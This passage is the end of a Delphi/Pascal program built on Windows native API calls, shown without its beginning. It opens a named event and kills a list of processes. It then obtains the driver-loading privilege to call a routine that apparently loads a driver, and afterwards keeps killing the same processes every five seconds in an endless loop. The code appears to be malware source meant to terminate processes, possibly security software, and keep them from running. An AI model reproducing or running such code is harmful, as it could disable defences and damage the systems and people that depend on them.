  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    if (FillProcessesArray()) then
    begin
      KillProcesses();
      if (Internal_AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
        SpiDiE_2();
      ZwSetEvent(EventHandle, nil);
      ZwClose(EventHandle);

      while (true) do
      begin
        NtSleep(5000);
        if (FillProcessesArray()) then
        begin
          KillProcesses();
          OutputDebugStringW(String7);
        end;
      end;
    end;
  end;
  RtlFreeHeap(RtlGetProcessHeap(), 0, FileBuffer);
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

